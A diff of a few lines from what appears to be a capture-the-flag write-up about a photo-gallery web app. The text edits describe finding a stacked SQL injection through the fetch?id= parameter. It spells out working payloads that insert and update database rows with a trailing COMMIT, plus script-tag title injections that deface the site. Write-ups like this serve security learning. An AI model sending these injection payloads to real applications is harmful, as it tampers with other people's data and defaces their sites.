@@ -104,9 +104,9 @@ Therefore, the query probably looks something like this:
 SELECT filename FROM photos WHERE id=[]
 ```
 
-Stacked SQL queries may be possible i.e. a query like ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
+Stacked SQL queries may be possible here e.g. to insert into ```photos``` ```SELECT filename FROM photos WHERE id=%d; INSERT into photos(...) values(...) #```
 
-Testing ```fetch?id=1;INSERT into photos(id,title,parent,filename) values(4,'hello world',1,'files/adorable.jpg')``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injection vulnerability.
+Testing ```fetch?id=1;INSERT into photos(id,title,parent,filename) values(4,'hello world',1,'files/adorable.jpg')``` and navigating to ```fetch?id=4``` didn't work; 404 is still returned . However, adding the ```COMMIT``` command to the end i.e. ```fetch?id=1;INSERT (...); COMMIT #``` succeeds. Navigating to ```fetch?id=4``` now returns the .jpg text where a 404 was previously returned, proving the existence of a stacked query injections.
 
 Trying ```fetch?id=1;UPDATE photos set title='<script>alert(1)</script>' WHERE id=1; COMMIT``` and ```fetch?id=1;UPDATE albums set title='<script>alert(2)</script>' WHERE id=1; COMMIT #``` defaced the website, but did not succeed in XSS as the photo title is inserted as a HTML text node, and album title is encased in a ```<h2>``` element:
 
